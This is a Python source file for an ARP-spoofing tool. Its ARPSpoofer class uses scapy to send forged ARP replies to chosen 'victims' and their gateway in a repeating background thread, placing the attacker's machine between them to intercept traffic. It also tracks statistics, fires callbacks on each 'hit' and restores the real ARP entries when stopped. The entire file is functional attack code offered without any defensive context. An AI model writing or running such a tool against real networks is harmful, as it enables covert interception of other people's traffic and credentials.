from __future__ import annotations

import threading
import time
from typing import Optional, Callable

import scapy.all as scapy
from loguru import logger

from spoof.models import ARPTarget, ARPVictim, SessionStats
from spoof.core.packet_injector import PacketInjector


class ARPSpoofer:
    def __init__(
        self,
        targets: list[ARPTarget],
        interface: str,
        interval: float = 2.0,
        injector: PacketInjector | None = None,
    ):
        self._targets = [t for t in targets if t.enabled]
        self._interface = interface
        self._interval = interval
        self._injector = injector or PacketInjector(interface)
        self._running = False
        self._thread: Optional[threading.Thread] = None
        self._stats_lock = threading.Lock()
        self._stats = SessionStats()
        self._hit_callbacks: list[Callable] = []
        self._restore_entries: list[tuple] = []

    @property
    def stats(self) -> SessionStats:
        return self._stats

    def on_hit(self, callback: Callable) -> None:
        self._hit_callbacks.append(callback)

    def _resolve_entries(self) -> None:
        for target in self._targets:
            if not target.gateway_mac:
                target.gateway_mac = self._injector.resolve_mac(target.gateway, self._interface)
            for v in target.victims:
                if not v.mac:
                    v.mac = self._injector.resolve_mac(v.ip, self._interface)

    def _spoof_one(self, target: ARPTarget) -> None:
        own_mac = scapy.get_if_hwaddr(self._interface)
        gateway_ip = target.gateway
        gateway_mac = target.gateway_mac

        for victim in target.victims:
            victim_mac = victim.mac
            if not victim_mac:
                continue

            self._injector.send_arp_reply(
                src_mac=own_mac,
                dst_mac=victim_mac,
                spoof_ip=gateway_ip,
                target_ip=victim.ip,
                interface=self._interface,
            )

            if gateway_mac:
                self._injector.send_arp_reply(
                    src_mac=own_mac,
                    dst_mac=gateway_mac,
                    spoof_ip=victim.ip,
                    target_ip=gateway_ip,
                    interface=self._interface,
                )

            entry = (gateway_mac, victim.ip, victim_mac, gateway_ip)
            if entry not in self._restore_entries:
                self._restore_entries.append(entry)

            with self._stats_lock:
                self._stats.arp_packets_sent += 2
                self._stats.arp_targets_active = 1

            for cb in self._hit_callbacks:
                try:
                    cb(gateway=gateway_ip, victim=victim.ip, action="arp_spoof")
                except Exception as e:
                    logger.warning(f"hit callback error: {e}")

    def _spoof_loop(self) -> None:
        logger.info(f"arp spoofer loop started ({len(self._targets)} targets, interval={self._interval}s)")
        while self._running:
            for target in self._targets:
                if not target.enabled:
                    continue
                self._spoof_one(target)
            time.sleep(self._interval)

    def _restore_all(self) -> None:
        own_mac = scapy.get_if_hwaddr(self._interface)
        for real_gw_mac, victim_ip, victim_mac, gw_ip in self._restore_entries:
            logger.info(f"restoring arp: {victim_ip} <- gateway {gw_ip} ({real_gw_mac})")
            self._injector.send_arp_restore(
                real_gateway_mac=real_gw_mac or "ff:ff:ff:ff:ff:ff",
                victim_ip=victim_ip,
                victim_mac=victim_mac or "ff:ff:ff:ff:ff:ff",
                gateway_ip=gw_ip,
                interface=self._interface,
            )
        self._restore_entries.clear()

    def start(self) -> None:
        self._running = True
        self._resolve_entries()
        self._thread = threading.Thread(target=self._spoof_loop, daemon=True)
        self._thread.start()
        logger.info(f"arp spoofer started ({len(self._targets)} targets)")

    def stop(self, restore: bool = True) -> None:
        self._running = False
        if restore:
            self._restore_all()
        logger.info("arp spoofer stopped")
